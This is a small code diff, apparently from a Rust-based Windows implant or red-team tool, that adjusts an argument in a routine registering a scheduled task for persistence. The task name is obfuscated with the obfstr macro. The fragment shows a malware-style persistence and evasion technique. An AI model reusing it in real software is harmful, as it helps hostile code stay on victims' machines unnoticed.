@@ -72,7 +72,7 @@ impl PersistenceTrait for ScheduledTaskPersistence {
             folder.RegisterTaskDefinition(
                 &BSTR::from(obfstr::obfstr!(TASK_NAME)),
                 &task,
-                TASK_CREATE_OR_UPDATE.0 as i32,
+                TASK_CREATE_OR_UPDATE.0,
                 &null_var,
                 &null_var,
                 TASK_LOGON_INTERACTIVE_TOKEN,
